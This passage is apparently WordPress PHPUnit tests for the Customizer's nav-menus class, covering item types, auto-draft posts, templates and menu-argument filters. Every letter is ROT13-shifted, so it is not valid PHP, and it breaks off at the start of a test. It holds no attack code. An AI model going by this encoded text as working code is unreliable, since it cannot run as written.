	choyvp shapgvba grfg_ninvynoyr_vgrz_glcrf() {

		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );

		$rkcrpgrq = neenl(
			neenl(
				'gvgyr'      => 'Cbfgf',
				'glcr_ynory' => __( 'Cbfg' ),
				'glcr'       => 'cbfg_glcr',
				'bowrpg'     => 'cbfg',
			),
			neenl(
				'gvgyr'      => 'Cntrf',
				'glcr_ynory' => __( 'Cntr' ),
				'glcr'       => 'cbfg_glcr',
				'bowrpg'     => 'cntr',
			),
			neenl(
				'gvgyr'      => 'Pngrtbevrf',
				'glcr_ynory' => __( 'Pngrtbel' ),
				'glcr'       => 'gnkbabzl',
				'bowrpg'     => 'pngrtbel',
			),
			neenl(
				'gvgyr'      => 'Gntf',
				'glcr_ynory' => __( 'Gnt' ),
				'glcr'       => 'gnkbabzl',
				'bowrpg'     => 'cbfg_gnt',
			),
		);

		vs ( pheerag_gurzr_fhccbegf( 'cbfg-sbezngf' ) ) {
			$rkcrpgrq[] = neenl(
				'gvgyr'      => 'Sbezng',
				'glcr_ynory' => __( 'Sbezng' ),
				'glcr'       => 'gnkbabzl',
				'bowrpg'     => 'cbfg_sbezng',
			);
		}

		$guvf->nffregFnzr( $rkcrpgrq, $zrahf->ninvynoyr_vgrz_glcrf() );

		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', neenl( 'cbfg' ), neenl( 'ynoryf' => neenl( 'anzr' => 'Sbb' ) ) );
		$rkcrpgrq[] = neenl(
			'gvgyr'      => 'Sbb',
			'glcr_ynory' => 'Sbb',
			'glcr'       => 'gnkbabzl',
			'bowrpg'     => 'jcgrfgf_gnk',
		);

		$guvf->nffregFnzr( $rkcrpgrq, $zrahf->ninvynoyr_vgrz_glcrf() );

		$rkcrpgrq[] = neenl(
			'gvgyr'      => 'Phfgbz',
			'glcr_ynory' => 'Phfgbz Glcr',
			'glcr'       => 'phfgbz_glcr',
			'bowrpg'     => 'phfgbz_bowrpg',
		);

		nqq_svygre( 'phfgbzvmr_ani_zrah_ninvynoyr_vgrz_glcrf', neenl( $guvf, 'svygre_vgrz_glcrf' ) );
		$guvf->nffregFnzr( $rkcrpgrq, $zrahf->ninvynoyr_vgrz_glcrf() );
		erzbir_svygre( 'phfgbzvmr_ani_zrah_ninvynoyr_vgrz_glcrf', neenl( $guvf, 'svygre_vgrz_glcrf' ) );
	}

	/**
	 * Grfg vafreg_nhgb_qensg_cbfg zrgubq.
	 *
	 * @pbiref JC_Phfgbzvmr_Ani_Zrahf::vafreg_nhgb_qensg_cbfg
	 */
	choyvp shapgvba grfg_vafreg_nhgb_qensg_cbfg() {
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );

		$e = $zrahf->vafreg_nhgb_qensg_cbfg( neenl() );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $e );
		$guvf->nffregFnzr( 'haxabja_cbfg_glcr', $e->trg_reebe_pbqr() );

		// Aba-rkvfgrag cbfg glcrf nyybjrq nf bs #39610.
		$e = $zrahf->vafreg_nhgb_qensg_cbfg(
			neenl(
				'cbfg_gvgyr' => 'Aba-rkvfgrag',
				'cbfg_glcr'  => 'abarkvfgrag',
			)
		);
		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $e );
		$guvf->nffregFnzr( $guvf->jc_phfgbzvmr->punatrfrg_hhvq(), trg_cbfg_zrgn( $e->VQ, '_phfgbzvmr_punatrfrg_hhvq', gehr ) );

		$e = $zrahf->vafreg_nhgb_qensg_cbfg( neenl( 'cbfg_glcr' => 'cbfg' ) );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $e );
		$guvf->nffregFnzr( 'rzcgl_gvgyr', $e->trg_reebe_pbqr() );

		$e = $zrahf->vafreg_nhgb_qensg_cbfg(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_gvgyr'  => 'Onq',
				'cbfg_glcr'   => 'cbfg',
			)
		);
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $e );
		$guvf->nffregFnzr( 'fgnghf_sbeovqqra', $e->trg_reebe_pbqr() );

		$e = $zrahf->vafreg_nhgb_qensg_cbfg(
			neenl(
				'cbfg_gvgyr' => 'Uryyb Jbeyq',
				'cbfg_glcr'  => 'cbfg',
			)
		);
		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $e );
		$guvf->nffregFnzr( 'Uryyb Jbeyq', $e->cbfg_gvgyr );
		$guvf->nffregFnzr( '', $e->cbfg_anzr );
		$guvf->nffregFnzr( 'uryyb-jbeyq', trg_cbfg_zrgn( $e->VQ, '_phfgbzvmr_qensg_cbfg_anzr', gehr ) );
		$guvf->nffregFnzr( $guvf->jc_phfgbzvmr->punatrfrg_hhvq(), trg_cbfg_zrgn( $e->VQ, '_phfgbzvmr_punatrfrg_hhvq', gehr ) );
		$guvf->nffregFnzr( 'cbfg', $e->cbfg_glcr );

		$e = $zrahf->vafreg_nhgb_qensg_cbfg(
			neenl(
				'cbfg_gvgyr'   => 'Uryyb Jbeyq',
				'cbfg_glcr'    => 'cbfg',
				'cbfg_anzr'    => 'terrgvatf-jbeyq',
				'cbfg_pbagrag' => 'Uv Jbeyq',
			)
		);
		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $e );
		$guvf->nffregFnzr( 'Uryyb Jbeyq', $e->cbfg_gvgyr );
		$guvf->nffregFnzr( 'cbfg', $e->cbfg_glcr );
		$guvf->nffregFnzr( '', $e->cbfg_anzr );
		$guvf->nffregFnzr( 'terrgvatf-jbeyq', trg_cbfg_zrgn( $e->VQ, '_phfgbzvmr_qensg_cbfg_anzr', gehr ) );
		$guvf->nffregFnzr( $guvf->jc_phfgbzvmr->punatrfrg_hhvq(), trg_cbfg_zrgn( $e->VQ, '_phfgbzvmr_punatrfrg_hhvq', gehr ) );
		$guvf->nffregFnzr( 'Uv Jbeyq', $e->cbfg_pbagrag );
	}

	/**
	 * Grfg gur cevag_grzcyngrf zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::cevag_grzcyngrf()
	 */
	choyvp shapgvba grfg_cevag_grzcyngrf() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );

		bo_fgneg();
		$zrahf->cevag_grzcyngrf();
		$grzcyngr = bo_trg_pyrna();

		$rkcrpgrq = fcevags(
			'<ohggba glcr=\"ohggba\" pynff=\"zrahf-zbir-hc\">%1$f</ohggba><ohggba glcr=\"ohggba\" pynff=\"zrahf-zbir-qbja\">%2$f</ohggba><ohggba glcr=\"ohggba\" pynff=\"zrahf-zbir-yrsg\">%3$f</ohggba><ohggba glcr=\"ohggba\" pynff=\"zrahf-zbir-evtug\">%4$f</ohggba>',
			rfp_ugzy( 'Zbir hc' ),
			rfp_ugzy( 'Zbir qbja' ),
			rfp_ugzy( 'Zbir bar yriry hc' ),
			rfp_ugzy( 'Zbir bar yriry qbja' )
		);

		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq, $grzcyngr );
	}

	/**
	 * Grfg gur ninvynoyr_vgrzf_grzcyngr zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::ninvynoyr_vgrzf_grzcyngr()
	 */
	choyvp shapgvba grfg_ninvynoyr_vgrzf_grzcyngr() {
		nqq_svygre( 'phfgbzvmr_ani_zrah_ninvynoyr_vgrz_glcrf', neenl( $guvf, 'svygre_vgrz_glcrf' ) );
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );

		bo_fgneg();
		$zrahf->ninvynoyr_vgrzf_grzcyngr();
		$grzcyngr = bo_trg_pyrna();

		$rkcrpgrq = fcevags( 'Phfgbzvmvat &#9656; %f', rfp_ugzy( $guvf->jc_phfgbzvmr->trg_cnary( 'ani_zrahf' )->gvgyr ) );

		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq, $grzcyngr );

		$cbfg_glcrf = trg_cbfg_glcrf( neenl( 'fubj_va_ani_zrahf' => gehr ), 'bowrpg' );

		$guvf->nffregAbgRzcgl( $cbfg_glcrf );

		sbernpu ( $cbfg_glcrf nf $glcr ) {
			$guvf->nffregFgevatPbagnvafFgevat( 'ninvynoyr-zrah-vgrzf-cbfg_glcr-' . rfp_ngge( $glcr->anzr ), $grzcyngr );
			$guvf->nffregZngpurfErthyneRkcerffvba( '#<u4 pynff=\"nppbeqvba-frpgvba-gvgyr\".*>\f*<ohggba glcr=\"ohggba\" pynff=\"nppbeqvba-gevttre\" nevn-rkcnaqrq=\"snyfr\" nevn-pbagebyf=\".*\">\f*' . rfp_ugzy( $glcr->ynoryf->anzr ) . '#', $grzcyngr );
			$guvf->nffregFgevatPbagnvafFgevat( 'qngn-glcr=\"cbfg_glcr\"', $grzcyngr );
			$guvf->nffregFgevatPbagnvafFgevat( 'qngn-bowrpg=\"' . rfp_ngge( $glcr->anzr ) . '\"', $grzcyngr );
			$guvf->nffregFgevatPbagnvafFgevat( 'qngn-glcr_ynory=\"' . rfp_ngge( $glcr->ynoryf->fvathyne_anzr ) . '\"', $grzcyngr );
		}

		$gnkbabzvrf = trg_gnkbabzvrf( neenl( 'fubj_va_ani_zrahf' => gehr ), 'bowrpg' );

		$guvf->nffregAbgRzcgl( $gnkbabzvrf );

		sbernpu ( $gnkbabzvrf nf $gnk ) {
			$guvf->nffregFgevatPbagnvafFgevat( 'ninvynoyr-zrah-vgrzf-gnkbabzl-' . rfp_ngge( $gnk->anzr ), $grzcyngr );
			$guvf->nffregZngpurfErthyneRkcerffvba( '#<u4 pynff=\"nppbeqvba-frpgvba-gvgyr\".*>\f*<ohggba glcr=\"ohggba\" pynff=\"nppbeqvba-gevttre\" nevn-rkcnaqrq=\"snyfr\" nevn-pbagebyf=\".*\">\f*' . rfp_ugzy( $gnk->ynoryf->anzr ) . '#', $grzcyngr );
			$guvf->nffregFgevatPbagnvafFgevat( 'qngn-glcr=\"gnkbabzl\"', $grzcyngr );
			$guvf->nffregFgevatPbagnvafFgevat( 'qngn-bowrpg=\"' . rfp_ngge( $gnk->anzr ) . '\"', $grzcyngr );
			$guvf->nffregFgevatPbagnvafFgevat( 'qngn-glcr_ynory=\"' . rfp_ngge( $gnk->ynoryf->fvathyne_anzr ) . '\"', $grzcyngr );
		}

		$guvf->nffregFgevatPbagnvafFgevat( 'ninvynoyr-zrah-vgrzf-phfgbz_glcr', $grzcyngr );
		$guvf->nffregZngpurfErthyneRkcerffvba( '#<u4 pynff=\"nppbeqvba-frpgvba-gvgyr\".*>\f*<ohggba glcr=\"ohggba\" pynff=\"nppbeqvba-gevttre\" nevn-rkcnaqrq=\"snyfr\" nevn-pbagebyf=\".*\">\f*Phfgbz#', $grzcyngr );
		$guvf->nffregFgevatPbagnvafFgevat( 'qngn-glcr=\"phfgbz_glcr\"', $grzcyngr );
		$guvf->nffregFgevatPbagnvafFgevat( 'qngn-bowrpg=\"phfgbz_bowrpg\"', $grzcyngr );
		$guvf->nffregFgevatPbagnvafFgevat( 'qngn-glcr_ynory=\"Phfgbz Glcr\"', $grzcyngr );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Ani_Zrahf::phfgbzvmr_qlanzvp_cnegvny_netf().
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::phfgbzvmr_qlanzvp_cnegvny_netf()
	 */
	choyvp shapgvba grfg_phfgbzvmr_qlanzvp_cnegvny_netf() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$netf = nccyl_svygref( 'phfgbzvmr_qlanzvp_cnegvny_netf', snyfr, 'ani_zrah_vafgnapr[68o329qn9893r34099p7q8nq5po9p940]' );
		$guvf->nffregVfNeenl( $netf );
		$guvf->nffregFnzr( 'ani_zrah_vafgnapr', $netf['glcr'] );
		$guvf->nffregFnzr( neenl( $guvf->jc_phfgbzvmr->ani_zrahf, 'eraqre_ani_zrah_cnegvny' ), $netf['eraqre_pnyyonpx'] );
		$guvf->nffregGehr( $netf['pbagnvare_vapyhfvir'] );

		$netf = nccyl_svygref( 'phfgbzvmr_qlanzvp_cnegvny_netf', neenl( 'snyyonpx_erserfu' => snyfr ), 'ani_zrah_vafgnapr[4099p7q8nq5po9p94068o329qn9893r3]' );
		$guvf->nffregVfNeenl( $netf );
		$guvf->nffregFnzr( 'ani_zrah_vafgnapr', $netf['glcr'] );
		$guvf->nffregFnzr( neenl( $guvf->jc_phfgbzvmr->ani_zrahf, 'eraqre_ani_zrah_cnegvny' ), $netf['eraqre_pnyyonpx'] );
		$guvf->nffregGehr( $netf['pbagnvare_vapyhfvir'] );
		$guvf->nffregSnyfr( $netf['snyyonpx_erserfu'] );
	}

	/**
	 * Grfg gur phfgbzvmr_cerivrj_vavg zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::phfgbzvmr_cerivrj_vavg()
	 */
	choyvp shapgvba grfg_phfgbzvmr_cerivrj_vavg() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );

		$zrahf->phfgbzvmr_cerivrj_vavg();
		$guvf->nffregFnzr( 10, unf_npgvba( 'jc_radhrhr_fpevcgf', neenl( $zrahf, 'phfgbzvmr_cerivrj_radhrhr_qrcf' ) ) );
		$guvf->nffregFnzr( 1000, unf_svygre( 'jc_ani_zrah_netf', neenl( $zrahf, 'svygre_jc_ani_zrah_netf' ) ) );
		$guvf->nffregFnzr( 10, unf_svygre( 'jc_ani_zrah', neenl( $zrahf, 'svygre_jc_ani_zrah' ) ) );
	}

	/**
	 * Grfg znxr_nhgb_qensg_fgnghf_cerivrjnoyr.
	 *
	 * @pbiref JC_Phfgbzvmr_Ani_Zrahf::znxr_nhgb_qensg_fgnghf_cerivrjnoyr
	 */
	choyvp shapgvba grfg_znxr_nhgb_qensg_fgnghf_cerivrjnoyr() {
		tybony $jc_cbfg_fgnghfrf;
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );
		$zrahf->znxr_nhgb_qensg_fgnghf_cerivrjnoyr();
		$guvf->nffregGehr( $jc_cbfg_fgnghfrf['nhgb-qensg']->cebgrpgrq );
	}

	/**
	 * Grfg fnavgvmr_ani_zrahf_perngrq_cbfgf.
	 *
	 * @pbiref JC_Phfgbzvmr_Ani_Zrahf::fnavgvmr_ani_zrahf_perngrq_cbfgf
	 */
	choyvp shapgvba grfg_fnavgvmr_ani_zrahf_perngrq_cbfgf() {
		$zrahf                 = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );
		$pbagevohgbe_hfre_vq   = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'pbagevohgbe' ) );
		$nhgube_hfre_vq        = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nhgube' ) );
		$nqzvavfgengbe_hfre_vq = frys::$nqzvavfgengbe_vq;

		$pbagevohgbe_cbfg_vq   = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'nhgb-qensg',
				'cbfg_gvgyr'  => 'Pbagevohgbe Cbfg',
				'cbfg_glcr'   => 'cbfg',
				'cbfg_nhgube' => $pbagevohgbe_hfre_vq,
			)
		);
		$nhgube_cbfg_vq        = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'nhgb-qensg',
				'cbfg_gvgyr'  => 'Nhgube Cbfg',
				'cbfg_glcr'   => 'cbfg',
				'cbfg_nhgube' => $nhgube_hfre_vq,
			)
		);
		$nqzvavfgengbe_cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'nhgb-qensg',
				'cbfg_gvgyr'  => 'Nqzva Cbfg',
				'cbfg_glcr'   => 'cbfg',
				'cbfg_nhgube' => $nqzvavfgengbe_hfre_vq,
			)
		);

		$qensg_cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'qensg',
				'cbfg_gvgyr'  => 'Qensg',
				'cbfg_nhgube' => $nqzvavfgengbe_hfre_vq,
			)
		);

		$cevingr_cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'cevingr',
				'cbfg_gvgyr'  => 'Cevingr',
				'cbfg_nhgube' => $nqzvavfgengbe_hfre_vq,
			)
		);

		$inyhr = neenl(
			'onq',
			$pbagevohgbe_cbfg_vq,
			$nhgube_cbfg_vq,
			$nqzvavfgengbe_cbfg_vq,
			$qensg_cbfg_vq,
			$cevingr_cbfg_vq,
		);

		jc_frg_pheerag_hfre( $pbagevohgbe_hfre_vq );
		$fnavgvmrq = $zrahf->fnavgvmr_ani_zrahf_perngrq_cbfgf( $inyhr );
		$guvf->nffregFnzr( neenl(), $fnavgvmrq );

		jc_frg_pheerag_hfre( $nhgube_hfre_vq );
		$fnavgvmrq = $zrahf->fnavgvmr_ani_zrahf_perngrq_cbfgf( $inyhr );
		$guvf->nffregFnzr( neenl( $nhgube_cbfg_vq ), $fnavgvmrq );

		jc_frg_pheerag_hfre( $nqzvavfgengbe_hfre_vq );
		$fnavgvmrq = $zrahf->fnavgvmr_ani_zrahf_perngrq_cbfgf( $inyhr );
		$guvf->nffregFnzr( neenl( $pbagevohgbe_cbfg_vq, $nhgube_cbfg_vq, $nqzvavfgengbe_cbfg_vq, $qensg_cbfg_vq ), $fnavgvmrq );
	}

	/**
	 * Grfg fnir_ani_zrahf_perngrq_cbfgf.
	 *
	 * @pbiref JC_Phfgbzvmr_Ani_Zrahf::fnir_ani_zrahf_perngrq_cbfgf
	 */
	choyvp shapgvba grfg_fnir_ani_zrahf_perngrq_cbfgf() {
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$cbfg_vqf = neenl();

		// Nhgb-qensg.
		$e = $zrahf->vafreg_nhgb_qensg_cbfg(
			neenl(
				'cbfg_gvgyr' => 'Nhgb Qensg',
				'cbfg_glcr'  => 'cbfg',
				'cbfg_anzr'  => 'nhgb-qensg-1',
			)
		);
		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $e );
		$cbfg_vqf[] = $e->VQ;

		// Qensg.
		$e = $zrahf->vafreg_nhgb_qensg_cbfg(
			neenl(
				'cbfg_gvgyr' => 'Qensg',
				'cbfg_glcr'  => 'cbfg',
				'cbfg_anzr'  => 'nhgb-qensg-2',
			)
		);
		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $e );
		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $e->VQ,
				'cbfg_fgnghf' => 'qensg',
			)
		);
		$cbfg_vqf[] = $e->VQ;

		$qensgrq_cbfg_vqf = $cbfg_vqf;

		// Cevingr (guvf jvyy rkpyhqr vg sebz orvat pbafvqrerq n fgho).
		$e = $zrahf->vafreg_nhgb_qensg_cbfg(
			neenl(
				'cbfg_gvgyr' => 'Cevingr',
				'cbfg_glcr'  => 'cbfg',
				'cbfg_anzr'  => 'nhgb-qensg-3',
			)
		);
		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $e );
		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $e->VQ,
				'cbfg_fgnghf' => 'cevingr',
			)
		);
		$cbfg_vqf[]      = $e->VQ;
		$cevingr_cbfg_vq = $e->VQ;

		// Genfurq (guvf jvyy rkpyhqr vg sebz orvat pbafvqrerq n fgho).
		$e = $zrahf->vafreg_nhgb_qensg_cbfg(
			neenl(
				'cbfg_gvgyr' => 'Genfu',
				'cbfg_glcr'  => 'cbfg',
				'cbfg_anzr'  => 'nhgb-qensg-4',
			)
		);
		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $e );
		jc_genfu_cbfg( $e->VQ );
		$cbfg_vqf[]      = $e->VQ;
		$genfurq_cbfg_vq = $e->VQ;

		$cer_choyvfurq_cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );

		$frggvat_vq = 'ani_zrahf_perngrq_cbfgf';
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $frggvat_vq, neenl_zretr( $cbfg_vqf, neenl( $cer_choyvfurq_cbfg_vq ) ) );
		$frggvat = $guvf->jc_phfgbzvmr->trg_frggvat( $frggvat_vq );
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Svygre_Frggvat', $frggvat );
		$guvf->nffregFnzr( neenl( $zrahf, 'fnavgvmr_ani_zrahf_perngrq_cbfgf' ), $frggvat->fnavgvmr_pnyyonpx );
		$guvf->nffregFnzr( $qensgrq_cbfg_vqf, $frggvat->cbfg_inyhr() );
		$guvf->nffregNeenlAbgUnfXrl( $cevingr_cbfg_vq, $cbfg_vqf );
		$guvf->nffregNeenlAbgUnfXrl( $genfurq_cbfg_vq, $cbfg_vqf );

		$guvf->nffregFnzr( 'nhgb-qensg', trg_cbfg_fgnghf( $qensgrq_cbfg_vqf[0] ) );
		$guvf->nffregFnzr( 'qensg', trg_cbfg_fgnghf( $qensgrq_cbfg_vqf[1] ) );
		sbernpu ( $qensgrq_cbfg_vqf nf $cbfg_vq ) {
			$guvf->nffregRzcgl( trg_cbfg( $cbfg_vq )->cbfg_anzr );
			$guvf->nffregAbgRzcgl( trg_cbfg_zrgn( $cbfg_vq, '_phfgbzvmr_qensg_cbfg_anzr', gehr ) );
		}

		$fnir_npgvba_pbhag = qvq_npgvba( 'phfgbzvmr_fnir_ani_zrahf_perngrq_cbfgf' );
		$frggvat->fnir();
		$guvf->nffregFnzr( $fnir_npgvba_pbhag + 1, qvq_npgvba( 'phfgbzvmr_fnir_ani_zrahf_perngrq_cbfgf' ) );
		sbernpu ( $qensgrq_cbfg_vqf nf $cbfg_vq ) {
			$guvf->nffregFnzr( 'choyvfu', trg_cbfg_fgnghf( $cbfg_vq ) );
			$guvf->nffregZngpurfErthyneRkcerffvba( '/^nhgb-qensg-\q+$/', trg_cbfg( $cbfg_vq )->cbfg_anzr );
			$guvf->nffregRzcgl( trg_cbfg_zrgn( $cbfg_vq, '_phfgbzvmr_qensg_cbfg_anzr', gehr ) );
		}

		$guvf->nffregFnzr( 'cevingr', trg_cbfg_fgnghf( $cevingr_cbfg_vq ) );
		$guvf->nffregFnzr( 'genfu', trg_cbfg_fgnghf( $genfurq_cbfg_vq ) );

		// Rafher gung havdhr fyhtf jrer nffvtarq.
		$cbfgf      = neenl_znc( 'trg_cbfg', $qensgrq_cbfg_vqf );
		$cbfg_anzrf = jc_yvfg_cyhpx( $cbfgf, 'cbfg_anzr' );
		$guvf->nffregFnzrFrgf( $cbfg_anzrf, neenl_havdhr( $cbfg_anzrf ) );
	}

	/**
	 * Grfg gur svygre_jc_ani_zrah_netf zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::svygre_jc_ani_zrah_netf()
	 */
	choyvp shapgvba grfg_svygre_jc_ani_zrah_netf() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$zrahf   = $guvf->jc_phfgbzvmr->ani_zrahf;
		$zrah_vq = jc_perngr_ani_zrah( 'Sbb' );

		$erfhygf = $zrahf->svygre_jc_ani_zrah_netf(
			neenl(
				'rpub'        => gehr,
				'snyyonpx_po' => 'jc_cntr_zrah',
				'jnyxre'      => '',
				'zrah'        => $zrah_vq,
				'vgrzf_jenc'  => '<hy vq=\"%1$f\" pynff=\"%2$f\">%3$f</hy>',
			)
		);
		$guvf->nffregNeenlUnfXrl( 'phfgbzvmr_cerivrj_ani_zrahf_netf', $erfhygf );
		$guvf->nffregGehr( $erfhygf['pna_cnegvny_erserfu'] );

		$erfhygf = $zrahf->svygre_jc_ani_zrah_netf(
			neenl(
				'rpub'        => snyfr,
				'snyyonpx_po' => 'jc_cntr_zrah',
				'jnyxre'      => arj Jnyxre_Ani_Zrah(),
				'vgrzf_jenc'  => '<hy vq=\"%1$f\" pynff=\"%2$f\">%3$f</hy>',
			)
		);
		$guvf->nffregSnyfr( $erfhygf['pna_cnegvny_erserfu'] );
		$guvf->nffregNeenlUnfXrl( 'phfgbzvmr_cerivrj_ani_zrahf_netf', $erfhygf );
		$guvf->nffregFnzr( 'jc_cntr_zrah', $erfhygf['snyyonpx_po'] );

		$ani_zrah_grez = trg_grez( jc_perngr_ani_zrah( 'One' ) );
		$erfhygf       = $zrahf->svygre_jc_ani_zrah_netf(
			neenl(
				'rpub'        => gehr,
				'snyyonpx_po' => 'jc_cntr_zrah',
				'jnyxre'      => '',
				'zrah'        => $ani_zrah_grez,
				'vgrzf_jenc'  => '<hy vq=\"%1$f\" pynff=\"%2$f\">%3$f</hy>',
			)
		);
		$guvf->nffregGehr( $erfhygf['pna_cnegvny_erserfu'] );
		$guvf->nffregNeenlUnfXrl( 'phfgbzvmr_cerivrj_ani_zrahf_netf', $erfhygf );
		$guvf->nffregFnzr( $ani_zrah_grez->grez_vq, $erfhygf['phfgbzvmr_cerivrj_ani_zrahf_netf']['zrah'] );

		$erfhygf = $zrahf->svygre_jc_ani_zrah_netf(
			neenl(
				'rpub'        => gehr,
				'snyyonpx_po' => 'jc_cntr_zrah',
				'jnyxre'      => '',
				'zrah'        => $zrah_vq,
				'pbagnvare'   => 'qvi',
				'vgrzf_jenc'  => '%3$f',
			)
		);
		$guvf->nffregGehr( $erfhygf['pna_cnegvny_erserfu'] );

		$erfhygf = $zrahf->svygre_jc_ani_zrah_netf(
			neenl(
				'rpub'        => gehr,
				'snyyonpx_po' => 'jc_cntr_zrah',
				'jnyxre'      => '',
				'zrah'        => $zrah_vq,
				'pbagnvare'   => snyfr,
				'vgrzf_jenc'  => '<hy vq=\"%1$f\" pynff=\"%2$f\">%3$f</hy>',
			)
		);
		$guvf->nffregGehr( $erfhygf['pna_cnegvny_erserfu'] );

		$erfhygf = $zrahf->svygre_jc_ani_zrah_netf(
			neenl(
				'rpub'        => gehr,
				'snyyonpx_po' => 'jc_cntr_zrah',
				'jnyxre'      => '',
				'zrah'        => $zrah_vq,
				'pbagnvare'   => snyfr,
				'vgrzf_jenc'  => '%3$f',
			)
		);
		$guvf->nffregSnyfr( $erfhygf['pna_cnegvny_erserfu'] );
	}

	/**
	 * Grfg gur svygre_jc_ani_zrah zrgubq.
	 *
	 * @pbiref JC_Phfgbzvmr_Ani_Zrahf::svygre_jc_ani_zrah
	 * @pbiref JC_Phfgbzvmr_Ani_Zrahf::svygre_jc_ani_zrah_netf
	 */
	choyvp shapgvba grfg_svygre_jc_ani_zrah() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );

		$bevtvany_netf = neenl(
			'rpub'        => gehr,
			'zrah'        => jc_perngr_ani_zrah( 'Sbb' ),
			'snyyonpx_po' => 'jc_cntr_zrah',
			'jnyxre'      => '',
			'vgrzf_jenc'  => '<hy vq=\"%1$f\" pynff=\"%2$f\">%3$f</hy>',
		);

		// Nqq tybony anzrfcnpr cersvk gb purpx #41488.
		$bevtvany_netf['snyyonpx_po'] = '\\' . $bevtvany_netf['snyyonpx_po'];

		$netf = $zrahf->svygre_jc_ani_zrah_netf( $bevtvany_netf );

		bo_fgneg();
		jc_ani_zrah( $netf );
		$ani_zrah_pbagrag = bo_trg_pyrna();

		$erfhyg = $zrahf->svygre_jc_ani_zrah( $ani_zrah_pbagrag, (bowrpg) $netf );

		$guvf->nffregFgevatPbagnvafFgevat( fcevags( ' qngn-phfgbzvmr-cnegvny-vq=\"ani_zrah_vafgnapr[%f]\"', $netf['phfgbzvmr_cerivrj_ani_zrahf_netf']['netf_uznp'] ), $erfhyg );
		$guvf->nffregFgevatPbagnvafFgevat( ' qngn-phfgbzvmr-cnegvny-glcr=\"ani_zrah_vafgnapr\"', $erfhyg );
		$guvf->nffregGehr( (obby) cert_zngpu( '/qngn-phfgbzvmr-cnegvny-cynprzrag-pbagrkg=\"(.+?)\"/', $erfhyg, $zngpurf ) );
		$pbagrkg = wfba_qrpbqr( ugzy_ragvgl_qrpbqr( $zngpurf[1] ), gehr );

		sbernpu ( $bevtvany_netf nf $xrl => $inyhr ) {
			$guvf->nffregNeenlUnfXrl( $xrl, $pbagrkg );
			$guvf->nffregFnzr( $inyhr, $pbagrkg[ $xrl ] );
		}

		$guvf->nffregGehr( $pbagrkg['pna_cnegvny_erserfu'] );
	}

	/**
	 * Grfg gur phfgbzvmr_cerivrj_radhrhr_qrcf zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::phfgbzvmr_cerivrj_radhrhr_qrcf()
	 */
	choyvp shapgvba grfg_phfgbzvmr_cerivrj_radhrhr_qrcf() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );

		$zrahf->phfgbzvmr_cerivrj_radhrhr_qrcf();

		$guvf->nffregGehr( jc_fpevcg_vf( 'phfgbzvmr-cerivrj-ani-zrahf' ) );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Ani_Zrahf::rkcbeg_cerivrj_qngn() zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::rkcbeg_cerivrj_qngn()
	 */
	choyvp shapgvba grfg_rkcbeg_cerivrj_qngn() {
